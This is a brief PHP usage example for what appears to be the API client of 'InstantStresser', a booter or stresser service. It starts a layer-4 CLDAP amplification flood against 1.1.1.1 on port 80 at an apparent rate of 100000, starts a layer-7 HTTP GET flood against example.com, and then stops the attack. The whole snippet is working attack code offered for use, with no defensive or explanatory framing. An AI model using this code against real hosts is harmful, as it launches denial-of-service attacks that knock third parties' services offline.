<?php

use InstantStresser\InstantStresserApi;

$api = new InstantStresserApi('USER_ID', 'MY_KEY');

$api->startL4('1.1.1.1', 80, 15, 'CLDAP', 1, 100000);
$api->startL7('https://example.com/', 15, 'HTTP1', 1, 'GET', false);
$api->stop('1.1.1.1');
